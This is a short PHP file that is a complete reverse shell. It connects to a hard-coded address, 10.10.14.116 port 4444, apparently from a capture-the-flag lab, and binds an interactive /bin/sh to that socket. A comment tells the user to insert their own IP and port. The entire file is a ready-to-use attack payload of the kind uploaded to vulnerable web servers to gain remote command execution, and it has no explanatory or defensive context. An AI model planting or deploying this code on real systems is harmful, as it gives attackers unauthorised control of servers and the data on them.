<?php
// Replace with your IP and port
$ip = '10.10.14.116';
$port = 4444;

// Set up socket
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', [
    0 => $sock,
    1 => $sock,
    2 => $sock
], $pipes);
?>